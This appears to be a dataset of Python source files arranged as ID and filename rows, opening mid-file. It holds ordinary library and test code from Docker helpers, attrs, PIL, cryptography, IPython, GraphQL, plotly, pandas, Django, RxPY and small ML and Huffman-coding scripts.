Some docker related convenience functions
""""""
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import os
import socket
from structlog import get_logger

from docker import Client, errors


docker_socket = os.environ.get('DOCKER_SOCK', 'unix://tmp/docker.sock')
log = get_logger()

def get_my_containers_name():
    """"""
    Return the docker containers name in which this process is running.
    To look up the container name, we use the container ID extracted from the
    $HOSTNAME environment variable (which is set by docker conventions).
    :return: String with the docker container name (or None if any issue is
             encountered)
    """"""
    my_container_id = os.environ.get('HOSTNAME', None)

    try:
        docker_cli = Client(base_url=docker_socket)
        info = docker_cli.inspect_container(my_container_id)

    except Exception, e:
        log.exception('failed', my_container_id=my_container_id, e=e)
        raise

    name = info['Name'].lstrip('/')

    return name

def get_all_running_containers():
    try:
        docker_cli = Client(base_url=docker_socket)
        containers = docker_cli.containers()

    except Exception, e:
        log.exception('failed', e=e)
        raise

    return containers

def inspect_container(id):
    try:
        docker_cli = Client(base_url=docker_socket)
        info = docker_cli.inspect_container(id)
    except Exception, e:
        log.exception('failed-inspect-container', id=id, e=e)
        raise

    return info
"
JD440	JD440-main_test.py	"# Copyright 2016 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import mock
from protorpc import message_types

import main


def test_list_greetings(testbed):
    api = main.GreetingApi()
    response = api.list_greetings(message_types.VoidMessage())
    assert len(response.items) == 2


def test_get_greeting(testbed):
    api = main.GreetingApi()
    request = main.GreetingApi.get_greeting.remote.request_type(id=1)
    response = api.get_greeting(request)
    assert response.message == 'goodbye world!'


def test_multiply_greeting(testbed):
    api = main.GreetingApi()
    request = main.GreetingApi.multiply_greeting.remote.request_type(
        times=4,
        message='help I\'m trapped in a test case.')
    response = api.multiply_greeting(request)
    assert response.message == 'help I\'m trapped in a test case.' * 4


def test_authed_greet(testbed):
    api = main.AuthedGreetingApi()

    with mock.patch('main.endpoints.get_current_user') as user_mock:
        user_mock.return_value = None
        response = api.greet(message_types.VoidMessage())
        assert response.message == 'Hello, Anonymous'

        user_mock.return_value = mock.Mock()
        user_mock.return_value.email.return_value = 'user@example.com'
        response = api.greet(message_types.VoidMessage())
        assert response.message == 'Hello, user@example.com'"
JY69	JY69-exceptions.py	"# SPDX-License-Identifier: MIT


class FrozenError(AttributeError):
    """"""
    A frozen/immutable instance or attribute have been attempted to be
    modified.

    It mirrors the behavior of ``namedtuples`` by using the same error message
    and subclassing `AttributeError`.

    .. versionadded:: 20.1.0
    """"""

    msg = ""can't set attribute""
    args = [msg]


class FrozenInstanceError(FrozenError):
    """"""
    A frozen instance has been attempted to be modified.

    .. versionadded:: 16.1.0
    """"""


class FrozenAttributeError(FrozenError):
    """"""
    A frozen attribute has been attempted to be modified.

    .. versionadded:: 20.1.0
    """"""


class AttrsAttributeNotFoundError(ValueError):
    """"""
    An ``attrs`` function couldn't find an attribute that the user asked for.

    .. versionadded:: 16.2.0
    """"""


class NotAnAttrsClassError(ValueError):
    """"""
    A non-``attrs`` class has been passed into an ``attrs`` function.

    .. versionadded:: 16.2.0
    """"""


class DefaultAlreadySetError(RuntimeError):
    """"""
    A default has been set using ``attr.ib()`` and is attempted to be reset
    using the decorator.

    .. versionadded:: 17.1.0
    """"""


class UnannotatedAttributeError(RuntimeError):
    """"""
    A class with ``auto_attribs=True`` has an ``attr.ib()`` without a type
    annotation.

    .. versionadded:: 17.3.0
    """"""


class PythonTooOldError(RuntimeError):
    """"""
    It was attempted to use an ``attrs`` feature that requires a newer Python
    version.

    .. versionadded:: 18.2.0
    """"""


class NotCallableError(TypeError):
    """"""
    A ``attr.ib()`` requiring a callable has been set with a value
    that is not callable.

    .. versionadded:: 19.2.0
    """"""

    def __init__(self, msg, value):
        super(TypeError, self).__init__(msg, value)
        self.msg = msg
        self.value = value

    def __str__(self):
        return str(self.msg)"
JD500	JD500-pre-train.py	"import lightly.data as data

# the collate function applies random transforms to the input images
collate_fn = data.ImageCollateFunction(input_size=32, cj_prob=0.5)
import torch

# create a dataset from your image folder
dataset = data.LightlyDataset(input_dir='./my/cute/cats/dataset/')

# build a PyTorch dataloader
dataloader = torch.utils.data.DataLoader(
    dataset,                # pass the dataset to the dataloader
    batch_size=128,         # a large batch size helps with the learning
    shuffle=True,           # shuffling is important!
    collate_fn=collate_fn)  # apply transformations to the input images
import torchvision

from lightly.loss import NTXentLoss
from lightly.models.modules.heads import SimCLRProjectionHead

# use a resnet backbone
resnet = torchvision.models.resnext101_64x4d()  # or efficientnet0_b0
resnet = torch.nn.Sequential(*list(resnet.children())[:-1])

# build a SimCLR model
class SimCLR(torch.nn.Module):
    def __init__(self, backbone, hidden_dim, out_dim):
        super().__init__()
        self.backbone = backbone
        self.projection_head = SimCLRProjectionHead(hidden_dim, hidden_dim, out_dim)

    def forward(self, x):
        h = self.backbone(x).flatten(start_dim=1)
        z = self.projection_head(h)
        return z

model = SimCLR(resnet, hidden_dim=512, out_dim=128)

# use a criterion for self-supervised learning
# (normalized temperature-scaled cross entropy loss)
criterion = NTXentLoss(temperature=0.5)

# get a PyTorch optimizer
optimizer = torch.optim.SGD(model.parameters(), lr=1e-0, weight_decay=1e-5)
device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
max_epochs = 10
for epoch in range(max_epochs):
    for (x0, x1), _, _ in dataloader:

        x0 = x0.to(device)
        x1 = x1.to(device)

        z0 = model(x0)
        z1 = model(x1)

        loss = criterion(z0, z1)
        loss.backward()

        optimizer.step()
        optimizer.zero_grad()"
JD260	JD260-openomci_event_bus.py	"#
# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
from google.protobuf.json_format import MessageToDict
from google.protobuf.message import Message
from simplejson import dumps
from common.event_bus import EventBusClient
from voltha.protos.omci_mib_db_pb2 import OpenOmciEvent
from voltha.protos.omci_alarm_db_pb2 import AlarmOpenOmciEvent
from common.utils.json_format import MessageToDict


class OpenOmciEventBus(object):
    """""" Event bus for publishing OpenOMCI related events. """"""
    __slots__ = (
        '_event_bus_client',  # The event bus client used to publish events.
        '_topic'              # the topic to publish to
    )

    def __init__(self):
        self._event_bus_client = EventBusClient()
        self._topic = 'openomci-events'

    def message_to_dict(m):
        return MessageToDict(m, True, True, False)

    def advertise(self, event_type, data):
        if isinstance(data, Message):
            msg = dumps(MessageToDict(data, True, True))
        elif isinstance(data, dict):
            msg = dumps(data)
        else:
            msg = str(data)

        event_func = AlarmOpenOmciEvent if 'AlarmSynchronizer' in msg \
                                  else OpenOmciEvent
        event = event_func(
                type=event_type,
                data=msg
        )

        self._event_bus_client.publish(self._topic, event)"
JD411	JD411-DcxImagePlugin.py	"#
# The Python Imaging Library.
# $Id$
#
# DCX file handling
#
# DCX is a container file format defined by Intel, commonly used
# for fax applications.  Each DCX file consists of a directory
# (a list of file offsets) followed by a set of (usually 1-bit)
# PCX files.
#
# History:
# 1995-09-09 fl   Created
# 1996-03-20 fl   Properly derived from PcxImageFile.
# 1998-07-15 fl   Renamed offset attribute to avoid name clash
# 2002-07-30 fl   Fixed file handling
#
# Copyright (c) 1997-98 by Secret Labs AB.
# Copyright (c) 1995-96 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

from . import Image
from ._binary import i32le as i32
from .PcxImagePlugin import PcxImageFile

MAGIC = 0x3ADE68B1  # QUIZ: what's this value, then?


def _accept(prefix):
    return len(prefix) >= 4 and i32(prefix) == MAGIC


##
# Image plugin for the Intel DCX format.


class DcxImageFile(PcxImageFile):

    format = ""DCX""
    format_description = ""Intel DCX""
    _close_exclusive_fp_after_loading = False

    def _open(self):

        # Header
        s = self.fp.read(4)
        if not _accept(s):
            msg = ""not a DCX file""
            raise SyntaxError(msg)

        # Component directory
        self._offset = []
        for i in range(1024):
            offset = i32(self.fp.read(4))
            if not offset:
                break
            self._offset.append(offset)

        self._fp = self.fp
        self.frame = None
        self.n_frames = len(self._offset)
        self.is_animated = self.n_frames > 1
        self.seek(0)

    def seek(self, frame):
        if not self._seek_check(frame):
            return
        self.frame = frame
        self.fp = self._fp
        self.fp.seek(self._offset[frame])
        PcxImageFile._open(self)

    def tell(self):
        return self.frame


Image.register_open(DcxImageFile.format, DcxImageFile, _accept)

Image.register_extension(DcxImageFile.format, "".dcx"")"
JD125	JD125-pbkdf2.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.


import typing

from cryptography import utils
from cryptography.exceptions import (
    AlreadyFinalized,
    InvalidKey,
    UnsupportedAlgorithm,
    _Reasons,
)
from cryptography.hazmat.primitives import constant_time, hashes
from cryptography.hazmat.primitives.kdf import KeyDerivationFunction


class PBKDF2HMAC(KeyDerivationFunction):
    def __init__(
        self,
        algorithm: hashes.HashAlgorithm,
        length: int,
        salt: bytes,
        iterations: int,
        backend: typing.Any = None,
    ):
        from cryptography.hazmat.backends.openssl.backend import (
            backend as ossl,
        )

        if not ossl.pbkdf2_hmac_supported(algorithm):
            raise UnsupportedAlgorithm(
                ""{} is not supported for PBKDF2 by this backend."".format(
                    algorithm.name
                ),
                _Reasons.UNSUPPORTED_HASH,
            )
        self._used = False
        self._algorithm = algorithm
        self._length = length
        utils._check_bytes(""salt"", salt)
        self._salt = salt
        self._iterations = iterations

    def derive(self, key_material: bytes) -> bytes:
        if self._used:
            raise AlreadyFinalized(""PBKDF2 instances can only be used once."")
        self._used = True

        utils._check_byteslike(""key_material"", key_material)
        from cryptography.hazmat.backends.openssl.backend import backend

        return backend.derive_pbkdf2_hmac(
            self._algorithm,
            self._length,
            self._salt,
            self._iterations,
            key_material,
        )

    def verify(self, key_material: bytes, expected_key: bytes) -> None:
        derived_key = self.derive(key_material)
        if not constant_time.bytes_eq(derived_key, expected_key):
            raise InvalidKey(""Keys do not match."")"
JY210	JY210-test_storemagic.py	"import tempfile, os
from pathlib import Path

from traitlets.config.loader import Config


def setup_module():
    ip.magic('load_ext storemagic')

def test_store_restore():
    assert 'bar' not in ip.user_ns, ""Error: some other test leaked `bar` in user_ns""
    assert 'foo' not in ip.user_ns, ""Error: some other test leaked `foo` in user_ns""
    assert 'foobar' not in ip.user_ns, ""Error: some other test leaked `foobar` in user_ns""
    assert 'foobaz' not in ip.user_ns, ""Error: some other test leaked `foobaz` in user_ns""
    ip.user_ns['foo'] = 78
    ip.magic('alias bar echo ""hello""')
    ip.user_ns['foobar'] = 79
    ip.user_ns['foobaz'] = '80'
    tmpd = tempfile.mkdtemp()
    ip.magic('cd ' + tmpd)
    ip.magic('store foo')
    ip.magic('store bar')
    ip.magic('store foobar foobaz')

    # Check storing
    assert ip.db[""autorestore/foo""] == 78
    assert ""bar"" in ip.db[""stored_aliases""]
    assert ip.db[""autorestore/foobar""] == 79
    assert ip.db[""autorestore/foobaz""] == ""80""

    # Remove those items
    ip.user_ns.pop('foo', None)
    ip.user_ns.pop('foobar', None)
    ip.user_ns.pop('foobaz', None)
    ip.alias_manager.undefine_alias('bar')
    ip.magic('cd -')
    ip.user_ns['_dh'][:] = []

    # Check restoring
    ip.magic(""store -r foo bar foobar foobaz"")
    assert ip.user_ns[""foo""] == 78
    assert ip.alias_manager.is_alias(""bar"")
    assert ip.user_ns[""foobar""] == 79
    assert ip.user_ns[""foobaz""] == ""80""

    ip.magic(""store -r"")  # restores _dh too
    assert any(Path(tmpd).samefile(p) for p in ip.user_ns[""_dh""])

    os.rmdir(tmpd)

def test_autorestore():
    ip.user_ns['foo'] = 95
    ip.magic('store foo')
    del ip.user_ns['foo']
    c = Config()
    c.StoreMagics.autorestore = False
    orig_config = ip.config
    try:
        ip.config = c
        ip.extension_manager.reload_extension(""storemagic"")
        assert ""foo"" not in ip.user_ns
        c.StoreMagics.autorestore = True
        ip.extension_manager.reload_extension(""storemagic"")
        assert ip.user_ns[""foo""] == 95
    finally:
        ip.config = orig_config"
JY92	JY92-__init__.py	"# -*- coding: utf-8 -*-
from ._parser import parse, parser, parserinfo, ParserError
from ._parser import DEFAULTPARSER, DEFAULTTZPARSER
from ._parser import UnknownTimezoneWarning

from ._parser import __doc__

from .isoparser import isoparser, isoparse

__all__ = ['parse', 'parser', 'parserinfo',
           'isoparse', 'isoparser',
           'ParserError',
           'UnknownTimezoneWarning']


###
# Deprecate portions of the private interface so that downstream code that
# is improperly relying on it is given *some* notice.


def __deprecated_private_func(f):
    from functools import wraps
    import warnings

    msg = ('{name} is a private function and may break without warning, '
           'it will be moved and or renamed in future versions.')
    msg = msg.format(name=f.__name__)

    @wraps(f)
    def deprecated_func(*args, **kwargs):
        warnings.warn(msg, DeprecationWarning)
        return f(*args, **kwargs)

    return deprecated_func

def __deprecate_private_class(c):
    import warnings

    msg = ('{name} is a private class and may break without warning, '
           'it will be moved and or renamed in future versions.')
    msg = msg.format(name=c.__name__)

    class private_class(c):
        __doc__ = c.__doc__

        def __init__(self, *args, **kwargs):
            warnings.warn(msg, DeprecationWarning)
            super(private_class, self).__init__(*args, **kwargs)

    private_class.__name__ = c.__name__

    return private_class


from ._parser import _timelex, _resultbase
from ._parser import _tzparser, _parsetz

_timelex = __deprecate_private_class(_timelex)
_tzparser = __deprecate_private_class(_tzparser)
_resultbase = __deprecate_private_class(_resultbase)
_parsetz = __deprecated_private_func(_parsetz)"
JY389	JY389-test_lone_anonymous_operation.py	"from graphql.language.location import SourceLocation
from graphql.validation.rules import LoneAnonymousOperation

from .utils import expect_fails_rule, expect_passes_rule


def anon_not_alone(line, column):
    return {
        ""message"": LoneAnonymousOperation.anonymous_operation_not_alone_message(),
        ""locations"": [SourceLocation(line, column)],
    }


def test_no_operations():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      fragment fragA on Type {
        field
      }
    """""",
    )


def test_one_anon_operation():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      {
        field
      }
    """""",
    )


def test_multiple_named_operation():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      query Foo {
        field
      }

      query Bar {
        field
      }
    """""",
    )


def test_anon_operation_with_fragment():
    expect_passes_rule(
        LoneAnonymousOperation,
        """"""
      {
        ...Foo
      }
      fragment Foo on Type {
        field
      }
    """""",
    )


def test_multiple_anon_operations():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7), anon_not_alone(5, 7)],
    )


def test_anon_operation_with_a_mutation():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      mutation Foo {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7)],
    )


def test_anon_operation_with_a_subscription():
    expect_fails_rule(
        LoneAnonymousOperation,
        """"""
      {
        fieldA
      }
      subscription Foo {
        fieldB
      }
    """""",
        [anon_not_alone(2, 7)],
    )"
JD256	JD256-onu_temp_red_alarm.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from voltha.protos.events_pb2 import AlarmEventType, AlarmEventSeverity, AlarmEventCategory
from voltha.extensions.alarms.adapter_alarms import AlarmBase


class OnuTempRedAlarm(AlarmBase):
    """"""
    The ONU Temperature Yellow Alarm is reported by both the CircuitPack
    (ME #6) and the ONT-G (ME # 256) to indicate no service has been shut
    down to avoid equipment damage. The operational state of the affected
    PPTPs indicates the affected services.

    For CircuitPack equipment alarms, the intf_id reported is that of the
    UNI's logical port number

    For ONT-G equipment alarms, the intf_id reported is that of the PON/ANI
    physical port number
    """"""
    def __init__(self, alarm_mgr, onu_id, intf_id):
        super(OnuTempRedAlarm, self).__init__(alarm_mgr, object_type='onu temperature red',
                                              alarm='ONU_TEMP_RED',
                                              alarm_category=AlarmEventCategory.ONU,
                                              alarm_type=AlarmEventType.ENVIRONMENT,
                                              alarm_severity=AlarmEventSeverity.CRITICAL)
        self._onu_id = onu_id
        self._intf_id = intf_id

    def get_context_data(self):
        return {'onu-id': self._onu_id,
                'onu-intf-id': self._intf_id}"
JY464	JY464-test_lexsort.py	"from pandas import MultiIndex
import pandas._testing as tm


class TestIsLexsorted:
    def test_is_lexsorted(self):
        levels = [[0, 1], [0, 1, 2]]

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 1, 2]]
        )
        assert index._is_lexsorted()

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 2, 1]]
        )
        assert not index._is_lexsorted()

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 1, 0, 1, 1], [0, 1, 0, 2, 2, 1]]
        )
        assert not index._is_lexsorted()
        assert index._lexsort_depth == 0

    def test_is_lexsorted_deprecation(self):
        # GH 32259
        with tm.assert_produces_warning(
            FutureWarning,
            match=""MultiIndex.is_lexsorted is deprecated as a public function"",
        ):
            MultiIndex.from_arrays([[""a"", ""b"", ""c""], [""d"", ""f"", ""e""]]).is_lexsorted()


class TestLexsortDepth:
    def test_lexsort_depth(self):
        # Test that lexsort_depth return the correct sortorder
        # when it was given to the MultiIndex const.
        # GH#28518

        levels = [[0, 1], [0, 1, 2]]

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 1, 2]], sortorder=2
        )
        assert index._lexsort_depth == 2

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 2, 1]], sortorder=1
        )
        assert index._lexsort_depth == 1

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 1, 0, 1, 1], [0, 1, 0, 2, 2, 1]], sortorder=0
        )
        assert index._lexsort_depth == 0

    def test_lexsort_depth_deprecation(self):
        # GH 32259
        with tm.assert_produces_warning(
            FutureWarning,
            match=""MultiIndex.lexsort_depth is deprecated as a public function"",
        ):
            MultiIndex.from_arrays([[""a"", ""b"", ""c""], [""d"", ""f"", ""e""]]).lexsort_depth"
JY275	JY275-_line.py	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scattersmith"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
JY195	JY195-model.py	"import pandas as pd
import numpy as np
import random

import matplotlib.pyplot as plt
import seaborn as sns

from plotly import graph_objs as go
from plotly import express as px
from plotly.subplots import make_subplots

import pickle
import lightgbm as lgb



colorarr = ['#0592D0','#Cd7f32', '#E97451', '#Bdb76b', '#954535', '#C2b280', '#808000','#C2b280', '#E4d008', '#9acd32', '#Eedc82', '#E4d96f',
           '#32cd32','#39ff14','#00ff7f', '#008080', '#36454f', '#F88379', '#Ff4500', '#Ffb347', '#A94064', '#E75480', '#Ffb6c1', '#E5e4e2',
           '#Faf0e6', '#8c92ac', '#Dbd7d2','#A7a6ba', '#B38b6d']


cropdf = pd.read_csv(""D:/Suyash College Files/Semester 6/22060 - Capstone Project Execution and Report Writing/Datasets/Crop_recommendation.csv"")

X = cropdf.drop('label', axis=1)
y = cropdf['label']

from sklearn.model_selection import train_test_split
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3,
                                                    shuffle = True, random_state = 0)

model = lgb.LGBMClassifier()
model.fit(X_train, y_train)

y_pred=model.predict(X_test)


from sklearn.metrics import accuracy_score

accuracy=accuracy_score(y_pred, y_test)
print('LightGBM Model accuracy score: {0:0.4f}'.format(accuracy_score(y_test, y_pred)))


y_pred_train = model.predict(X_train)
print('Training-set accuracy score: {0:0.4f}'. format(accuracy_score(y_train, y_pred_train)))

print('Training set score: {:.4f}'.format(model.score(X_train, y_train)))
print('Test set score: {:.4f}'.format(model.score(X_test, y_test)))


model.booster_.save_model('crop_predict1.h5')

        #        my_model.booster_.save_model('mode.txt')
        #        #load from model:
        #        #bst = lgb.Booster(model_file='mode.txt')



filename = ""trained_model.pkl""
pickle.dump(model,open(filename,'wb'))

print(""done with all"")

"
JY418	JY418-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""bar"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD285	JD285-Huffman编码.py	"from node import HuffmanNode


class Huffman():

    def __init__(self, s:str) -> None:
        self.__weights = self.__get_weights(s)
        self.__buffer = [b' ' for _ in range(round(len(self.__weights)))]
        self.__tree = self.__build_huffman_tree(self.__weights)
        self.__code = self.__build_code(self.__tree)

    @property
    def weights(self):
        return self.__weights

    @property
    def tree(self):
        return self.__tree

    @property
    def code(self):
        return self.__code

    def __get_weights(self, s:str) -> dict:
        weights = dict()
        for i in s:
            weights[i] = weights.get(i, 0)+1
        return weights
    
    def __build_huffman_tree(self, weights:dict):
        nodes = [HuffmanNode(value, weight) for value,weight in weights.items()]
        while len(nodes) > 1:
            nodes.sort(key=lambda node:node.weight, reverse=True)
            c = HuffmanNode(value=None, weight=(nodes[-1].weight+nodes[-2].weight))
            c.left_node = nodes.pop()
            c.right_node = nodes.pop()
            nodes.append(c)
        return nodes[0]

    def __build_code(self, tree):
        
        def func(tree:HuffmanNode, length:int):
            nonlocal code, self
            node = tree
            if not node:
                return
            elif node.value:
                code[node.value] = b''.join( self.__buffer[:length] )
                return
            self.__buffer[length] = b'0'
            func(node.left_node, length+1)
            self.__buffer[length] = b'1'
            func(node.right_node, length+1)
        
        code = dict()
        func(tree, 0)
        return code


if __name__ == ""__main__"":
    s = ""aabbccdddeefgenajojfonadkjfwqnioaerweggrefdsfassasdfgr""

    huffman = Huffman(s)

    print(huffman.weights)
    print(huffman.code)"
JY244	JY244-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""treemap"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD103	JD103-utils.py	"import functools
from importlib import import_module

from django.core.exceptions import ViewDoesNotExist
from django.utils.module_loading import module_has_submodule


@functools.lru_cache(maxsize=None)
def get_callable(lookup_view):
    """"""
    Return a callable corresponding to lookup_view.
    * If lookup_view is already a callable, return it.
    * If lookup_view is a string import path that can be resolved to a callable,
      import that callable and return it, otherwise raise an exception
      (ImportError or ViewDoesNotExist).
    """"""
    if callable(lookup_view):
        return lookup_view

    if not isinstance(lookup_view, str):
        raise ViewDoesNotExist(
            ""'%s' is not a callable or a dot-notation path"" % lookup_view
        )

    mod_name, func_name = get_mod_func(lookup_view)
    if not func_name:  # No '.' in lookup_view
        raise ImportError(
            ""Could not import '%s'. The path must be fully qualified."" % lookup_view
        )

    try:
        mod = import_module(mod_name)
    except ImportError:
        parentmod, submod = get_mod_func(mod_name)
        if submod and not module_has_submodule(import_module(parentmod), submod):
            raise ViewDoesNotExist(
                ""Could not import '%s'. Parent module %s does not exist.""
                % (lookup_view, mod_name)
            )
        else:
            raise
    else:
        try:
            view_func = getattr(mod, func_name)
        except AttributeError:
            raise ViewDoesNotExist(
                ""Could not import '%s'. View does not exist in module %s.""
                % (lookup_view, mod_name)
            )
        else:
            if not callable(view_func):
                raise ViewDoesNotExist(
                    ""Could not import '%s.%s'. View is not callable.""
                    % (mod_name, func_name)
                )
            return view_func


def get_mod_func(callback):
    # Convert 'django.views.news.stories.story_detail' to
    # ['django.views.news.stories', 'story_detail']
    try:
        dot = callback.rindex(""."")
    except ValueError:
        return callback, """"
    return callback[:dot], callback[dot + 1 :]"
JY338	JY338-singleordefault.py	"from rx import Observable, AnonymousObservable
from rx.internal.exceptions import SequenceContainsNoElementsError
from rx.internal import extensionmethod

def single_or_default_async(source, has_default=False, default_value=None):
    def subscribe(observer):
        value = [default_value]
        seen_value = [False]

        def on_next(x):
            if seen_value[0]:
                observer.on_error(Exception('Sequence contains more than one element'))
            else:
                value[0] = x
                seen_value[0] = True

        def on_completed():
            if not seen_value[0] and not has_default:
                observer.on_error(SequenceContainsNoElementsError())
            else:
                observer.on_next(value[0])
                observer.on_completed()

        return source.subscribe(on_next, observer.on_error, on_completed)
    return AnonymousObservable(subscribe)


@extensionmethod(Observable)
def single_or_default(self, predicate, default_value):
    """"""Returns the only element of an observable sequence that matches the
    predicate, or a default value if no such element exists this method
    reports an exception if there is more than one element in the observable
    sequence.

    Example:
    res = source.single_or_default()
    res = source.single_or_default(lambda x: x == 42)
    res = source.single_or_default(lambda x: x == 42, 0)
    res = source.single_or_default(None, 0)

    Keyword arguments:
    predicate -- {Function} A predicate function to evaluate for elements in
        the source sequence.
    default_value -- [Optional] The default value if the index is outside
        the bounds of the source sequence.

    Returns {Observable} Sequence containing the single element in the
    observable sequence that satisfies the condition in the predicate, or a
    default value if no such element exists.
    """"""

    return self.filter(predicate).single_or_default(None, default_value) if predicate else single_or_default_async(self, True, default_value)
    "
JD509	JD509-test_time_series.py	"import datetime

import numpy as np
import pytest

from pandas import (
    DataFrame,
    Series,
    _testing as tm,
)
from pandas.tests.io.pytables.common import ensure_clean_store

pytestmark = pytest.mark.single_cpu


def test_store_datetime_fractional_secs(setup_path):

    with ensure_clean_store(setup_path) as store:
        dt = datetime.datetime(2012, 1, 2, 3, 4, 5, 123456)
        series = Series([0], [dt])
        store[""a""] = series
        assert store[""a""].index[0] == dt


def test_tseries_indices_series(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
        tm.assert_class_equal(result.index, ser.index, obj=""series index"")

        idx = tm.makePeriodIndex(10)
        ser = Series(np.random.randn(len(idx)), idx)
        store[""a""] = ser
        result = store[""a""]

        tm.assert_series_equal(result, ser)
        assert result.index.freq == ser.index.freq
